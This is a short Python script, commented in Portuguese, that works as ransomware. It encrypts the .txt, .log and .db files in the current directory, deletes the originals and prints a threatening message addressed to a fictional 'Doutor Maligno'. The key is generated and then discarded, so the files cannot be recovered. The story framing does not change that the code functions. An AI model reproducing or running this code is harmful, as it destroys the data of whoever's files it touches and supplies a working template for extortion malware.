import os
from cryptography.fernet import Fernet

# Gera uma chave fixa para testes (em produção, use algo mais seguro)
key = Fernet.generate_key()
f = Fernet(key)

# Extensões que queremos criptografar
extensoes_alvo = ['.txt', '.log', '.db']

# Lista arquivos da pasta atual
arquivos = [f for f in os.listdir() if os.path.isfile(f) and os.path.splitext(f)[1] in extensoes_alvo]

# Criptografa os arquivos encontrados
for arquivo in arquivos:
    try:
        with open(arquivo, 'rb') as original:
            dados = original.read()
        criptografado = f.encrypt(dados)
        with open(arquivo + ".locked", 'wb') as locked:
            locked.write(criptografado)
        os.remove(arquivo)
        print(f"[✓] Arquivo criptografado: {arquivo}")
    except Exception as e:
        print(f"[!] Falha ao criptografar {arquivo}: {e}")

# Mensagem simbólica
print("\n--- MENSAGEM AO DOUTOR MALIGNO ---")
print("Se deseja recuperar seus dados, liberte suas vítimas.")
print("Este protocolo não busca lucro, apenas justiça.")
print("Você tem 24 horas antes que tudo se autodestrua.\n")

# Autodestruição simbólica
print("[⚠] Iniciando autodestruição do protocolo...")
print("[✓] Protocolo encerrado com segurança.")
